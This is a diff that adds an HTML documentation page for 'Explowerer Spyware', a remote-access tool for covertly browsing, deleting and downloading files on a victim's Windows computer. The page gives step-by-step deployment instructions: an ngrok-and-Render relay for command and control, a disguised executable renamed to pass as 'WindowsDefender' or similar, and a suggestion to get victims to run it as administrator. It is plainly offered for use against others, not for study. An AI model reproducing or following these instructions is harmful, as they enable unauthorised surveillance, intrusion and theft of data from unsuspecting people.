@@ -1,0 +1,121 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Explowerer - V-1</title>
+    <link rel="stylesheet" href="index.css">
+</head>
+<body>
+    <div class="main_body">
+        <h1 class="heading">Explowerer Spyware</h1>
+
+        <div class="box introduction">
+            <p>
+                <h2>Introduction</h2>
+                <hr class="px1">
+                This project is a spyware tool that enables remote access to the entire file system of a target computer over WAN. It provides a web-based GUI, allowing easy navigation and interaction with the target's file system, similar to using a file explorer on a local computer.</p>
+                <br>
+                <span>Features include the ability to :</span>
+                <ul>
+                    <li>Create Folder & File</li>
+                    <li>Delete Folder & File</li>
+                    <li>Rename File & Folder</li>
+                    <li>Download File % Folder</li>
+                </ul>
+            </p>
+        </div>
+
+        <div class="box installation">
+            <h2>Requirements</h1>
+            <hr class="px1">
+            <ul>
+                <li>Software : Python (12 or greater)</li>
+                <li>Operating System : Windows 10 or greater</li>
+                <li>Servies :</li>
+                <ul>
+                    <li><a href="https://dashboard.ngrok.com/signup" target="_blank">Ngrok Account</a> (Any Free OR Paid)</li>
+                    <li>Hosting Service (some free services are listed below) :</li>
+                    <ul>
+                        <li><a href="https://render.com/">Render</a></li>
+                        <li><a href="https://www.pythonanywhere.com/">Python Anywhere</a></li>
+                    </ul>
+                </ul>
+            </ul>
+            <h2>Installation</h2>
+            <hr class="px1">
+            <p>Step 1 : Download <a href="https://drive.google.com/drive/folders/1rVPkQ1ZSyPvvo4lP74kGTWAJOHHINa-G?usp=sharing" target="_blank" rel="noopener noreferrer">Explowerer Spyware (ZIP)</a></p>
+            <p>Step 2 : Right-click the zip file downloaded and click on <i>Extract Here</i></p>
+            <p>Step 3 : Go into the folder extracted there you will see 3 folders <i>ngrok linker</i>, <i>server</i>, <i>target</i></p>
+        </div>
+
+        <div class="box basics">
+            <h2>Understanding Basics</h2>
+            <p>To understand this project and how it works we need to know about the content of all the three folders you got after following <b>installation</b> process.</p>
+            <h2>1. ngrok linker</h2>
+            <p>
+                When the server starts, it launches a web server on localhost and simultaneously uses ngrok to make this web server accessible worldwide via a generated URL. The target device connects to this ngrok URL and communicates with the web server.
+                Each time the server restarts, ngrok generates a new URL. This dynamic URL change disrupts the target's connection, as the hard-coded URL in the target no longer points to the server, causing communication to fail.
+                <br>
+                To ensure the target can access the server reliably, even if the ngrok URL changes, we use a hosting service as an intermediate step.
+                The hosting service provides a fixed URL, which we embed in the target’s executable file. This URL remains consistent, ensuring the target can always locate the server’s updated address.
+                <br>
+                We have to upload this tool called ngrok linker to the hosting service. Each time the server starts, it sends the updated ngrok URL to this ngrok linker, which stores it.
+                <br>
+                When the target starts, it contacts the ngrok linker on the hosting service to retrieve the current ngrok URL. If the URL is valid, the target connects to the server. If not, the target retries, asking ngrok linker for an updated URL until a connection is established.
+            </p>
+            <span>📌 We are using render as hosting service.</span>
+            <h3 class="setup_easy">SETUP (WITHOUT GITHUB ACCOUNT)</h3>
+            <span>NOTE : If used this method so any change in github repository of user PowerPizza will also be altered to your render account which can may cause your connection with targets may be break. Although its chances are only 1% out of 100%</span>
+            <p>step 1 : Go to <a href="https://dashboard.render.com/register" target="_blank">render.com</a> and make an account.</p>
+            <p>step 2 : Then go to <a href="https://dashboard.render.com/" target="_blank">dashboard</a></p>
+            <p>step 3 : Select <i>deploy a web service</i></p>
+            <p>step 4 : Select <i>Public Git Repository</i></p>
+            <p>step 5 : Paste the following url : https://github.com/PowerPizza/ngrok-url-linker</p>
+            <p>step 6 : Click on connect</p>
+            <p>step 7 : Enter a unique name for your web service, this name gonna be prefix of your constant URL.</p>
+            <p>step 8 : Select <i>Python 3</i> (or above if available)</p>
+            <p>step 9 : Make sure that start command should be <i>gunicorn main:app</i></p>
+            <p>step 10 : Leave everything else default, select instance type free and click on <i>deploy web service</i></p>
+            <p>step 11 : Once your web service is deployed, copy the url it shows above looks something like <i>https://your_web_service_name.onrender.com</i></p>
+
+            <h3 class="setup_hard">SETUP (WITH GITHUB ACCOUNT)</h3>
+            <p>step 1 : go to <a href="https://github.com/">github.com</a> and create an URL there.</p>
+            <p>step 2 : Create a new public repository in github.</p>
+            <p>step 3 : Upload all the content of `ngrok linker` folder into that repository.</p>
+            <p>step 4 : Copy the url of your repository and proceed as per the <span onclick="document.getElementsByClassName('setup_easy')[0].scrollIntoView()" style="cursor: pointer;">SETUP (WITHOUT GITHUB ACCOUNT)</span></p>
+            
+
+            <h2>2. target</h2>
+            <p>This folder contains file that you can share in target's computer to get access of its file system but don't directly send files of this folder, actually this folder contains code only you need to replace some parts of the code so that target can connect directly to your hosting service then to you web server.</p>
+            <p>NOTE : This folder contains many files please don't rename, modify or move any file just follow the instruction given below.</p>
+            <h3>SETUP</h3>
+            <p>step 1 : Make sure you have installed python on your system by opening CMD and using command <i>python --version</i>, if it shows any error so please properly download python from <a href="https://www.python.org/downloads/" target="_blank">python.org</a></p>
+            <p>step 2 : Open targets folder and open infection_urls.py with any text editor you like.</p>
+            <p>step 3 : replace TARGET_NAME with a name that you think user can't detect like 'WindowsDefender', 'WindowsApplicationModel', 'MicrosoftServices' etc...</p>
+            <p>step 4 : replace NGROK_LINKER_URL with the URL of your hosting service that you have copied in previous section of 'ngrok linker'</p>
+            <p>step 5 : Save the file.</p>
+            <p>step 6 (OPTIONAL) : if you like to change icon of file that you will send to target, so replace the icon file of your choice with the target_icon.ico file just make sure the file you are replacing have same name <i>i.e. 'target_icon.ico'</i> and file should be an ico file not png or other.</p>
+            <p>step 7 : Run generate shareable (1).bat by double clicking and follow the directions it gives after few times you will get an exe file share that with your target and say them to run (or you yourself run) it as administrator (on target's computer) just for once.</p>
+            <p>NOTE : if shareable (1).bat not working so use shareable (2).bat</p>
+
+            <h2>3. server</h2>
+            <p>When the server starts, it sets up a web server on localhost and makes it accessible globally via a unique ngrok URL. This web server’s main role is to manage the targets that connect to it and provide access to their file systems. Through a file explorer GUI accessible in a web browser, users can navigate connected file systems seamlessly. Upon launching, the server displays two access options: an ngrok URL for remote access and a local IP address for access within the local network. Typically, you’ll use the local IP on your system to open the web server GUI and interact with connected devices, providing a straightforward way to browse files on each target.</p>
+            <h3>PRIMARY SETUP (NGROK)</h3>
+            <p>step 1 : Go to <a href="https://dashboard.ngrok.com/signup">ngrok.com</a> and make an account there.</p>
+            <p>step 2 : Copy the ngrok token it will look something like '24m7sFtHo_7w_________'</p>
+            <h3>SECONDRY SETUP (SERVER)</h3>
+            <p>step 1 : Go into the server folder.</p>
+            <p>step 2 : Open .env file with any text editor your like.</p>
+            <p>step 3 : Replace NGROK_AUTH_TOKEN with the ngrok token you just copied in primary setup.</p>
+            <p>step 4 : Replace ANY_SECRET_PASSWORD with any 16 digit long alpha-numeric set of charactes.</p>
+            <p>step 5 : Replace NGROK_LINKER_URL with the hosting url on which your ngrok linker is running.</p>
+            <p>step 6 : Save the file and go back into server folder</p>
+            <p>step 7 : Double click and start main.exe or main file</p>
+            <p>step 8 : Wait for few time (40-50sec) you will see IP address something like 'http:127.0.0.1:5000' put it in any browser to get GUI</p>
+            <p>NOTE : Ignore the ngrok url for now, Its used when any of your friend like to access the GUI interface without doing any installation in his computer so you can share this link to them, so that they can also access the GUI and access the target computer's file. Don't worry using it they can't access your computer's file untill you have not run that target file on your system. They simply use your computer's power to surf over target's file system if your system turned of or you closed the main program so they will can no longer access targets.</p>
+        </div>
+
+        <div class="box installation"></div>
+    </div>
+</body>
+</html>
